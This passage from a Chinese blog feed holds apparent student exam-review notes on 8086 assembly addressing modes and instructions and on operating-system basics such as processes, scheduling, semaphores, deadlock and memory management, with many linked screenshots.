<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225102812010.png" alt="image-20211225102812010"></li>
</ul>
</li>
<li><p>③存储器寻址</p>
<ul>
<li>1、直接寻址：操作数给出有效地址（偏移地址）<ul>
<li>MOV AL，[2000H]</li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225103438259.png" alt="image-20211225103438259"></li>
</ul>
</li>
<li>2、<strong>寄存器间接寻址：有效地址放在指定寄存器中</strong><ul>
<li><strong>BX、SI、DI——默认段为DS段，物理地址=DS*16+BX/SI/DI</strong></li>
<li><strong>BP——默认段为SS段，物理地址=SS*16+BP</strong></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225105352287.png" alt="image-20211225105352287"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225105557800.png" alt="image-20211225105557800"></li>
</ul>
</li>
</ul>
</li>
<li><p>3、<strong>寄存器相对寻址：有效地址是寄存器内容+位移</strong></p>
</li>
</ul>
</li>
<li><p>操作数的物理地址=16xDS+BX/SI/DI+位移|或者=16xSS +BP +位移</p>
<ul>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225110124553.png" alt="image-20211225110124553"></li>
</ul>
</li>
<li><p>4、<strong>基址加变址寻址方式：有效地址是基址寄存器和变址寄存器内容之和</strong></p>
<ul>
<li><p>操作数的物理地址=16xDS + BX(基址寄存器)+ SI/DI（变址寄存器）|或 = 16xSS + BP +SI/DI</p>
</li>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225112549491.png" alt="image-20211225112549491"></p>
</li>
<li><p>5、相对的基址加变址寻址方式</p>
</li>
</ul>
</li>
<li><p>操作数的物理地址=16XDS+BX+SI/DI+位移|或=16XSS+BP+SI/DI+位移</p>
<ul>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225113036426.png" alt="image-20211225113036426"></li>
</ul>
<ul>
<li><p>语法规则</p>
</li>
<li><p>1、源操作数与目的操作数长度要一致</p>
</li>
<li><p>类型要明确</p>
</li>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225113321730.png" alt="image-20211225113321730"></p>
</li>
<li><p>2、寄存器寻址与段地址 要对应</p>
</li>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225113443723.png" alt="image-20211225113443723"></p>
</li>
<li><p>[]中只能使用基址和变址即<strong>BX/BP/Si/Di</strong></p>
</li>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225113523967.png" alt="image-20211225113523967"></p>
</li>
<li><p>4、同一组内的寄存器不能同时出现在一个[]中。</p>
</li>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225113608487.png" alt="image-20211225113608487"></p>
</li>
<li><p>5、两个存储单元之间不能直接操作的</p>
</li>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225113659011.png" alt="image-20211225113659011"></p>
</li>
<li><p><strong>6、CS、IP、立即数不能做目的操作数</strong> IP指令指针  EA偏移地址</p>
</li>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225113733504.png" alt="image-20211225113733504"></p>
</li>
<li><p>7、当DS、ES、SS作目的操作数时，立即数不能做源操作数</p>
</li>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225113938506.png" alt="image-20211225113938506"></p>
</li>
<li><p>8、可用段超越前缀修改默认段</p>
</li>
<li><p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225155328686.png" alt="image-20211225155328686"></p>
</li>
</ul>
</li>
<li><p>数据传送指令</p>
<ul>
<li>MOV 目的，源<ul>
<li>功能：将源操作数的内容传送到目的操作数      </li>
</ul>
</li>
<li><strong>PUSH  源</strong><ul>
<li>功能：将源操作数压入堆栈中</li>
<li>过程：SP新 -&gt; SP原-2， 再入栈</li>
</ul>
</li>
<li><strong>POP目的</strong><ul>
<li>功能：将堆栈中数据弹出至目的操作数</li>
<li>过程：出栈、SP新 -&gt; SP原+2</li>
</ul>
</li>
<li><strong>XCHG 目的，源</strong><ul>
<li>功能：源操作数、目的操作数交换数据</li>
</ul>
</li>
<li>XLAT 转换表 或：XLATT<ul>
<li>功能：<strong>查表功能</strong></li>
</ul>
</li>
<li><strong>IN</strong> AX/AL， I/O地址<ul>
<li>I/O端口数据传输到AX、AL</li>
</ul>
</li>
<li><strong>OUT</strong> I/O地址，AX/AL<ul>
<li>AX、AL数据传输到I/O端口</li>
</ul>
</li>
<li><strong>LEA 目的操作数，源操作数</strong>  lea<ul>
<li>功能：取源操作数的地址偏移量，送到目的操作数</li>
</ul>
</li>
<li><strong>LDS 目的操作数，源操作数</strong>  <ul>
<li>取出四个字节，低地址两个字节送入目的操作数，高地址的两个字节送入DS寄存器</li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225162018079.png" alt="image-20211225162018079"></li>
<li>算术运算指令</li>
</ul>
</li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225162124828.png" alt="image-20211225162124828"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225162601494.png" alt="image-20211225162601494"><ul>
<li>逻辑运算</li>
</ul>
</li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225162954851.png" alt=""></li>
<li>NOT 目的 ——按位取反</li>
<li>AND 目的，源——目的与源-——&gt;目的</li>
<li>OR 目的，源——目的或源——&gt;目的</li>
<li>XOR 目的，源 —— 目的异或源——&gt;目的</li>
<li><strong>TEST 目的，源 ——目的与源，并修改标志位，但不回送结果</strong></li>
</ul>
</li>
</ul>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225163612868.png" alt="image-20211225163612868"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225164920411.png" alt="image-20211225164920411"></p>
<ul>
<li><p>串操作指令</p>
<ul>
<li><p>基础知识</p>
<ul>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225165018745.png" alt="image-20211225165018745"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225165125298.png" alt="image-20211225165125298"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225165144817.png" alt="image-20211225165144817"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225165320806.png" alt="image-20211225165320806"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225165336208.png" alt="image-20211225165336208"></li>
</ul>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225165426463.png" alt="image-20211225165426463"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225165958375.png" alt="image-20211225165958375"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225171126905.png" alt="image-20211225171126905"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225170155896.png" alt="image-20211225170155896"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225171057337.png" alt="image-20211225171057337"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225171352426.png" alt="image-20211225171352426"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225171402997.png" alt="image-20211225171402997"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225171426880.png" alt="image-20211225171426880"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225171442671.png" alt="image-20211225171442671"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225171534742.png" alt="image-20211225171534742"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225171604161.png" alt="image-20211225171604161"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225171628930.png" alt="image-20211225171628930"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225172036634.png" alt="image-20211225172036634"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225172025961.png" alt="image-20211225172025961"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225172057538.png" alt=""></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211225172125339.png" alt="image-20211225172125339"></p>
</li>
</ul>
</li>
</ul>
<h3 id="汇编语言程序设计"><a href="#汇编语言程序设计" class="headerlink" title="汇编语言程序设计"></a>汇编语言程序设计</h3><ul>
<li>汇编语言有三种基本语句：<strong>指令语句、伪指令语句、宏指令语句</strong></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225204411993.png" alt="image-20211225204411993"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225204454584.png" alt="image-20211225204454584"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225204540020.png" alt="image-20211225204540020"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225204731140.png" alt="image-20211225204731140"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225204802880.png" alt="image-20211225204802880"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225204837709.png" alt="image-20211225204837709"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225204906200.png" alt="image-20211225204906200"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211225204944444.png" alt="image-20211225204944444"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211226104045625.png" alt="image-20211226104045625"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211226104139487.png" alt="image-20211226104139487"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211226104222456.png" alt="image-20211226104222456"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211226104351505.png" alt="image-20211226104351505"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211226104444435.png" alt="image-20211226104444435"></li>
</ul>
<h3 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h3><ul>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211226105848849.png" alt="image-20211226105848849"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211226105945348.png" alt="image-20211226105945348"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211226111801577.png" alt="image-20211226111801577"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211226112047085.png" alt="image-20211226112047085"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211226112111391.png" alt="image-20211226112111391"></li>
</ul>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229215225312.png" alt="image-20211229215225312"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229215513023.png" alt="image-20211229215513023"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229220113039.png" alt="image-20211229220113039"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229220159626.png" alt="image-20211229220159626"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229220221919.png" alt="image-20211229220221919"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229220311773.png" alt="image-20211229220311773"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229220343305.png" alt="image-20211229220343305"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229220430268.png" alt="image-20211229220430268"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229220650679.png" alt="image-20211229220650679"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229220642309.png" alt="image-20211229220642309"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229220718898.png" alt="image-20211229220718898"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229220954606.png" alt="image-20211229220954606"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229221005462.png" alt="image-20211229221005462"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229222819876.png" alt="image-20211229222819876"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229230847203.png" alt="image-20211229230847203"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">data segment</span><br><span class="line">data1 db 15H ;被加数</span><br><span class="line">sum db 00H ;和</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">assume CS:code,DS:data</span><br><span class="line">start:</span><br><span class="line">MOV AX,data</span><br><span class="line">MOV DS, AX; 装入数据段</span><br><span class="line">MOV AL,data1;</span><br><span class="line">ADD AL,12H;</span><br><span class="line">MOV sum,AL; </span><br><span class="line">HLT;暂停</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229231543323.png" alt="image-20211229231543323"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229231612970.png" alt="image-20211229231612970"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229231943486.png" alt="image-20211229231943486"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229232018601.png" alt="image-20211229232018601"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229232043414.png" alt="image-20211229232043414"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229232108452.png" alt="image-20211229232108452"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229232431684.png" alt="image-20211229232431684"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229232452535.png" alt="image-20211229232452535"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229232703403.png" alt="image-20211229232703403"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229232932937.png" alt="image-20211229232932937"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229233007802.png" alt="image-20211229233007802"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229233058785.png" alt="image-20211229233058785"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229233158787.png" alt="image-20211229233158787"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229233236177.png" alt="image-20211229233236177"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229233454337.png" alt="image-20211229233454337"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229233653733.png" alt="image-20211229233653733"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229233725445.png" alt="image-20211229233725445"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229233744840.png" alt="image-20211229233744840"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229233830795.png" alt="image-20211229233830795"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229233851811.png" alt="image-20211229233851811"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229233919258.png" alt="image-20211229233919258"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229233940339.png" alt="image-20211229233940339"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229234009098.png" alt="image-20211229234009098"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229234111390.png" alt="image-20211229234111390"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229235521621.png" alt="image-20211229235521621"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229235602136.png" alt="image-20211229235602136"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229235655827.png" alt="image-20211229235655827"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229235728459.png" alt="image-20211229235728459"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229235821100.png" alt="image-20211229235821100"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211229235854332.png" alt="image-20211229235854332"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211230000221854.png" alt="image-20211230000221854"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211230000308034.png" alt="image-20211230000308034"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211230000403545.png" alt="image-20211230000403545"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211230000447611.png" alt="image-20211230000447611"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211230000534050.png" alt="image-20211230000534050"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211230000643348.png" alt="image-20211230000643348"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211230001108160.png" alt="image-20211230001108160"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211230001911990.png" alt="image-20211230001911990"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211230002034428.png" alt="image-20211230002034428"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211230002205918.png" alt="image-20211230002205918"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211230002440323.png" alt="image-20211230002440323"></p>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>微机原理</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】操作系统期末复习</title>
    <url>/posts/181.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第一章-操作系统引论"><a href="#第一章-操作系统引论" class="headerlink" title="第一章 操作系统引论"></a>第一章 操作系统引论</h2><h4 id="操作系统简介"><a href="#操作系统简介" class="headerlink" title="操作系统简介"></a>操作系统简介</h4><ul>
<li>手工操作阶段（无OS）<ul>
<li>缺点：人机速度矛盾</li>
</ul>
</li>
<li>批处理阶段（操作系统出现）<ul>
<li>1、单道批处理阶段 - 一个cpu只能运行一个程序</li>
<li>2、多道批处理阶段（OS正式诞生）——目的：提高系统资源的利用率——可以多程序间切换，所以多道批处理<ul>
<li>优点：多道程序并发执行，资源利用率搞</li>
<li>缺点：不提供人机交互能力（缺少交互性）</li>
</ul>
</li>
</ul>
</li>
<li>分时操作系统（不可以插队，有了人机交互）- 为每个程序分配一个时间片，每个程序运行完时间片轮转算法<ul>
<li>优：提供人机交互（交互性）</li>
<li>缺：<strong>不能优先处理紧急事务</strong></li>
</ul>
</li>
<li>实时操作系统（可以插队）<ul>
<li>硬实时系统：必须在被控制对象规定时间内完成（火箭发射）</li>
<li>软实时系统：可以松一些（订票）<ul>
<li>优点：能优先处理紧急任务</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>从可靠性看实时操作系统更强，从交互性看分时操作系统更强</p>
<h4 id="不得不知的概念"><a href="#不得不知的概念" class="headerlink" title="不得不知的概念"></a>不得不知的概念</h4><ul>
<li><p>两种指令</p>
<ul>
<li>特权指令：不允许用户程序使用（只允许操作系统使用）。如IO指令、置中断指令</li>
<li>非特权指令：普通的运算指令</li>
</ul>
</li>
<li><p>两种程序</p>
<ul>
<li>内核程序：系统的管理者，可执行一切指令、运行在核心态</li>
<li>应用程序：普通用户程序只能执行非特权指令，运行在用户态</li>
</ul>
</li>
<li><p>处理机状态</p>
<ul>
<li>用户态（目态）：CPU只能执行非特权指令</li>
<li>核心态（又称管态、内核态）：可以执行所有指令</li>
<li>用户态到核心态：通过中断（是硬件完成的）</li>
<li>核心态到用户态：特权指令psw的标志位0用户态1核心态</li>
<li>常考谁在用户态执行，谁在核心态执行</li>
</ul>
</li>
<li><p>原语</p>
<ul>
<li>1、处于操作系统的最底层，是最接近硬件的部分。</li>
<li>2、这些程序的运行具有原子性，其操作只能一气呵成</li>
<li>3、这些程序的运行时间都较短，而且调用频繁 </li>
</ul>
</li>
<li><p>中断和异常</p>
<ul>
<li>内中断（异常，信息来自内部）<ul>
<li>自愿中单–指令中断</li>
<li>强迫中断<ul>
<li>硬件中断</li>
<li>软件中断</li>
</ul>
</li>
</ul>
</li>
<li>外中断（中断，信号来自外部）<ul>
<li>外设请求</li>
<li>人工干预</li>
</ul>
</li>
</ul>
</li>
<li><p>系统调用</p>
<ul>
<li>系统给程序员（应用程序）提供的唯一接口，可获得OS的服务，在用户态发生，核心态处理</li>
</ul>
</li>
<li><p>体系结构</p>
<ul>
<li>大内核</li>
<li>微内核</li>
</ul>
</li>
</ul>
<h2 id="第二章-进程调度"><a href="#第二章-进程调度" class="headerlink" title="第二章 进程调度"></a>第二章 进程调度</h2><ul>
<li><p>进程管理</p>
<ul>
<li><p>引入进程目的</p>
<ul>
<li>为了更好地描述和控制程序并发执行，实现操作系统的并发性和共享性（进程是动态的，程序是静态）</li>
</ul>
</li>
<li><p>定义</p>
<ul>
<li>是计算机中程序关于某数据集合上的一次运行活动，是<strong>系统进行资源分配和调度的基本单位</strong></li>
</ul>
</li>
<li><p>组成</p>
<ul>
<li>PCB<ul>
<li>保存进程运行期间相关的数据，是进程存在的<strong>唯一标志</strong></li>
</ul>
</li>
<li>程序段<ul>
<li>能被进程调度到CPU的代码</li>
</ul>
</li>
<li>数据段</li>
</ul>
</li>
<li><p>进程的状态</p>
<ul>
<li><p>状态种类</p>
<ul>
<li>创建状态<ul>
<li>进程正在被创建</li>
</ul>
</li>
<li>就绪态<ul>
<li>进程已处于准备运行的状态，即进程获得了除处理机外的一切所需资源，一旦得到处理机即可运行</li>
</ul>
</li>
<li>运行态<ul>
<li>进程正在占用CPU</li>
</ul>
</li>
<li>结束状态<ul>
<li>进程正在从系统消失</li>
</ul>
</li>
</ul>
</li>
<li><p>状态变化</p>
<ul>
<li>就绪态-&gt;运行态</li>
<li>运行态-&gt;就绪态</li>
<li>运行态-&gt;阻塞态<ul>
<li>进程需要的某一资源还没准备好</li>
</ul>
</li>
<li>阻塞态-&gt;就绪态</li>
</ul>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211220171334073.png" alt=""></p>
</li>
</ul>
</li>
<li><p>线程</p>
<ul>
<li>引入目的<ul>
<li>为了更好的使用多道程序并发执行，提高资源利用率和系统吞吐量</li>
</ul>
</li>
<li>特点<ul>
<li>是<strong>程序执行的最小单位</strong>，基本不拥有任何系统资源（调度的基本单位）</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>处理机调度</p>
<ul>
<li>概念<ul>
<li>是对处理机进行分配，即从就绪队列中按照定好的算法（公平、高效）选择一个进程并将处理机分配给它运行，以实现进程并发地执行。</li>
</ul>
</li>
<li>分类<ul>
<li>高级调度（作业调度）（次数少）</li>
<li>中级调度（内存对换）（次数中等）（次数中点）</li>
<li>低级调度（进程调度）（次数少）</li>
</ul>
</li>
<li>调度方法<ul>
<li>剥夺式</li>
<li>非剥夺式</li>
</ul>
</li>
<li>调度准则<ul>
<li>CPU利用率</li>
<li>系统吞吐量 - 单位时间内 CPU完成时间的速度</li>
<li>周转时间 - 完成时间减去提交时间</li>
<li>等待时间 - 运行完之前都是</li>
<li>响应时间 - 从提交到第一次开始运行</li>
</ul>
</li>
<li>算法<ul>
<li>先来先服务</li>
<li>短作业优先</li>
<li>优先级调度算法</li>
<li>高响应比优先调度算法<ul>
<li>(运行+等待时间)/等待时间 &gt; 1</li>
</ul>
</li>
<li>时间片轮转<ul>
<li>为每个时间片分配一个算法，剥夺式的</li>
</ul>
</li>
<li>多级反馈队列调度算法</li>
</ul>
</li>
</ul>
</li>
<li><p>进程同步</p>
<ul>
<li>引入原因<ul>
<li>协调进程之间的相互制约关系</li>
</ul>
</li>
<li>制约关系<ul>
<li>同步<ul>
<li><strong>称直接制约关系</strong>，是指为完成某种任务而建立的两个或多个进程，这些进程因为需要在某些位置上协调它们的工作次序而等待、传递信息所产生的制约关系</li>
</ul>
</li>
<li>互斥<ul>
<li><strong>称间接制约关系</strong>。当一个进程进入临界区使用临界资源时，另有一个进程必须等待，当占用临界资源的进程退出临界区后，另进程才允许去访问此临界资源</li>
</ul>
</li>
</ul>
</li>
<li>临界资源<ul>
<li>一次仅允许一个进程使用的资源（打印机，共享缓冲区，共享变量，共用队列）</li>
</ul>
</li>
<li>临界区<ul>
<li>在每个进程中访问临界资源的那段程序</li>
</ul>
</li>
<li>临界区互斥<ul>
<li>原则<ul>
<li><strong>空闲让进</strong>：如果有若干进程要求进入空闲的临界区，一次仅允许一个进程进入</li>
<li><strong>忙则等待</strong>：任何时候，处于临界区内的进程不可多于一个。如已有进程进入自己的临界区，则其它所有试图进入临界区的进程必须等待。</li>
<li><strong>有限等待</strong>：进入临界区的进程要在有限时间内退出，以便其它进程能及时进入自己的临界区。</li>
<li><strong>让权等待</strong>：如果进程不能进入自己的临界区，则应让出CPU，避免进程出现“忙等”现象</li>
</ul>
</li>
<li>基本方法<ul>
<li>信号量：利用PV操作实现互斥</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>死锁</p>
<ul>
<li>产生的原因<ul>
<li>非剥夺资源的竞争和进程的不恰当推进顺序（与饥饿的区别）</li>
</ul>
</li>
<li>定义<ul>
<li>多个进程因竞争资源而造成的一种僵局，如果没有外力，这些进程将无法推进</li>
</ul>
</li>
<li>解决方法<ul>
<li>预防死锁<ul>
<li>破坏互斥条件</li>
<li>破坏不剥夺条件</li>
<li>破坏请求和保持条件</li>
<li>破坏循环等待条件</li>
</ul>
</li>
<li>避免死锁<ul>
<li><strong>安全状态</strong></li>
<li><strong>银行家算法</strong></li>
</ul>
</li>
<li>检测死锁：利用死锁定理</li>
<li>解锁死锁<ul>
<li>资源剥夺法</li>
<li>撤销进程法</li>
<li>进程回退法</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>习题</p>
<ul>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211220183244274.png" alt="image-20211220183244274"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211220190417146.png" alt="image-20211220190417146"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211220192756559.png" alt="image-20211220192756559"></li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211220194205344.png" alt="image-20211220194205344"><ul>
<li>临界区：访问临界资源的那段程序</li>
</ul>
</li>
<li>进程的同步与互斥<ul>
<li>同步：直接制约关系</li>
<li>互斥：间接制约关系</li>
</ul>
</li>
</ul>
</li>
<li><p>同步机制</p>
<ul>
<li>空闲让进</li>
<li>忙则等待</li>
<li>有限等待</li>
<li>让权等待</li>
</ul>
</li>
<li><p>信号量（是一种有效实现进程同步和互斥的工具）</p>
<ul>
<li>信号量的值大于0：表示当前资源可用数量（S=5 表示 5个可用资源）</li>
<li>小于0：其绝对值表示等待使用该资源的进程个数（S=-5，有五个进程在等待S）</li>
<li>信号量初值为非负的整数变量，代表资源数</li>
<li>信号量值可变，但仅能由P、V操作来改变。</li>
</ul>
</li>
<li><p>P/V操作原语</p>
<ul>
<li>P操作原语P(S)<ul>
<li>P操作一次，S值减1，即s=s-1（请求分配一资源）；</li>
<li>如果S&gt;=0，则该进程继续执行；如果S&lt;0表示无资源，则该进程的状态置为阻塞态，把相应的PCB连入该信号量队列的末尾，并放弃处理机，进行等待（直至另一个进程执行V（S）操作）</li>
</ul>
</li>
<li>V操作原语V(S)<ul>
<li>V操作一次，S值加1，即s=s+1（释放一单位量资源）;</li>
<li>如果S&gt;0,表示有资源，则该进程继续执行；如果S&lt;=0,则释放信号量队列上的第一个PCB所对应的进程（阻塞态改为就绪态），执行V操作的进程继续执行</li>
</ul>
</li>
</ul>
</li>
<li><p>死锁产生的必要条件</p>
<ul>
<li>互斥条件</li>
<li>不可剥夺条件</li>
<li>请求和保存条件</li>
<li>循环等待条件</li>
</ul>
</li>
<li><p>当死锁产生的时候一定会有这四个条件，有一个条件不成立都不会造成死锁。其中互斥使用资源时是无法破坏的。</p>
</li>
<li><p>解决死锁的一般方法</p>
<ul>
<li>死锁的预防<ul>
<li>主动出击，打破死锁产生的必要条件</li>
</ul>
</li>
<li>避免死锁的策略<ul>
<li>躲着他，防止进入不安全状态</li>
</ul>
</li>
<li>检测与恢复<ul>
<li>一开始不作为-&gt;一步到位</li>
<li>采用措施接触死锁</li>
</ul>
</li>
</ul>
</li>
<li><p>死锁预防和死锁避免</p>
<ul>
<li>破坏互斥条件（共享）<ul>
<li>如果允许系统资源都能共享使用，但有些资源根本无法使用，所以，这种防死锁的方法不太行，而且在有些场合应该保护这种互斥性</li>
</ul>
</li>
<li>破坏不剥夺条件<ul>
<li>释放已经保持的所有资源</li>
</ul>
</li>
<li>破坏请求和保持条件<ul>
<li>即进程在运行前一次申请完它所需要的全部资源，在它资源未满足前，不把它投入运行。</li>
<li>缺点就是系统资源被严重的浪费</li>
</ul>
</li>
<li>破坏循环等待条件<ul>
<li>为了破坏循环等待条件，可采用<strong>顺序资源分配法</strong></li>
</ul>
</li>
</ul>
</li>
<li><p>银行家算法</p>
<ul>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20211221162923255.png" alt="image-20211221162923255"></li>
</ul>
</li>
</ul>
<h2 id="第三章-内存管理"><a href="#第三章-内存管理" class="headerlink" title="第三章 内存管理"></a>第三章 内存管理</h2><ul>
<li>引入目的<ul>
<li>为了更好的支持多道程序的并发执行，提高系统性能</li>
</ul>
</li>
<li>主要功能<ul>
<li>内存空间的分配与回收</li>
<li>存储的保护和共享<ul>
<li>保证各道作业在各自的存储空间内运行，互不干扰</li>
</ul>
</li>
<li>地址转换<ul>
<li>在多道程序环境下，程序中的逻辑地址与内存中的物理地址不可能一致，因此存储管理必须提供地址变换功能，把逻辑地址转换成相应的物理地址。</li>
</ul>
</li>
<li>内存扩充<ul>
<li>利用虚拟存储技术或自动覆盖技术，从逻辑上扩充内存</li>
</ul>
</li>
</ul>
</li>
<li>用户程序的主要处理阶段<ul>
<li>编辑阶段<ul>
<li>创建源文件</li>
</ul>
</li>
<li>编译阶段<ul>
<li>由编译程序将用户源代码编译成若干目标模块，生成目标文件</li>
</ul>
</li>
